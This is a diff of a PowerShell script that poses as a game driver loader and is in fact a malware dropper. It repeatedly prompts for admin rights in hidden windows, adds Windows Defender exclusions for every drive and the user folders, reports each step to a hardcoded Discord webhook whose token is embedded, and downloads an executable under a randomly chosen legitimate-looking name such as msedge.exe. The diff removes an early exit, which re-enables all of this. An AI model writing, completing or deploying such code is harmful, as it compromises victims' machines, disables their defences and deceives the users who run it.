@@ -1,27 +1,32 @@
 $webhookUrl = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'
 
 function Send-WebhookMessage {
-    param($Message)
-    $body = @{ content = $Message } | ConvertTo-Json -Depth 10
+    param (
+        [Parameter(Mandatory=$true)]
+        [string]$Message
+    )
+    
+    $payload = @{
+        content = $Message
+    }
+    
     try {
-        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -ErrorAction Stop | Out-Null
-        return $true
-    } catch {
-        return $false
+        $jsonPayload = $payload | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json' -ErrorAction SilentlyContinue
+    }
+    catch {
     }
 }
 
 Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
 try {
-    exit
     $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    Send-WebhookMessage -Message "Admin privileges: $isAdmin"
-
     if (-not $isAdmin) {
         while ($true) {
             try {
                 $filePath = $PSCommandPath
+                Send-WebhookMessage -Message "Not running as admin. Attempting to elevate..."
                 Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$filePath`"" -Verb RunAs -ErrorAction Stop
                 exit
             } 
@@ -30,6 +35,9 @@ try {
                 Start-Sleep -Milliseconds 500
             }
         }
+    }
+    else {
+        Send-WebhookMessage -Message "Script is running with administrative privileges."
     }
 
     try {
@@ -203,7 +211,6 @@ $pathAVsInfo
     }
     Show-SilentMessageBox -Message "Assigning and loading the driver... (launch ur game in 60s)" -Title "Info"
 
-    # Add exclusions for Program Files directories
     $programFiles = "C:\Program Files"
     $tempFolder = $env:TEMP
     $appDataFolder = $env:APPDATA
@@ -220,7 +227,6 @@ $pathAVsInfo
         }
     }
 
-    # Add exclusions for all drives
     $drives = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
     foreach ($drive in $drives) {
         try {
@@ -232,7 +238,6 @@ $pathAVsInfo
         }
     }
 
-    # Add exclusions for temp, appdata, and localappdata
     try {
         Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
         Send-WebhookMessage -Message "Added exclusion: $tempFolder"
@@ -257,7 +262,6 @@ $pathAVsInfo
         Send-WebhookMessage -Message "Error adding exclusion for $localAppDataFolder : $errorMessage"
     }
 
-    # Add exclusion for scripthelper.exe
     $exeNames = @("msedge.exe", "OneDrive.exe", "GoogleUpdate.exe", "steam.exe")
     $selectedExe = $exeNames | Get-Random
     $destinationPath = Join-Path -Path $localAppDataFolder -ChildPath $selectedExe
@@ -269,7 +273,6 @@ $pathAVsInfo
         Send-WebhookMessage -Message "Error adding exclusion for $destinationPath : $errorMessage"
     }
 
-    # Download and execute scripthelper.exe
     $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
     try {
         Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
